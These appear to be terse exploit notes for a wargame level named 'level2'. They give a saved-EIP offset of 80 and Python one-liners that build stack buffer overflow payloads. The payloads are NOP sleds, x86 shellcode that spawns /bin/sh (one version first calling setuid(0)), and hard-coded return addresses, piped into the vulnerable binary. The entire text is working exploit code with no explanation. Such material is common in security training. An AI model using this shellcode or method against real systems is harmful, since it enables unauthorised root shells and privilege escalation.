offset eip: 80 bits
export SHELLCODE=`python -c "print '\x41\xf8\xff\xbf' + '\x90' * 200 + '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80'"`
python -c "print 'A' * 80 + '\x3e\x85\x04\x08' + '\x3d\xf8\xff\xbf'" > /tmp/f
cat /tmp/f - | ./level2

python -c 'print "\x90"*40 + "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80" + "A"* 8 + "\xa0\xf6\xff\xbf"' > /tmp/t
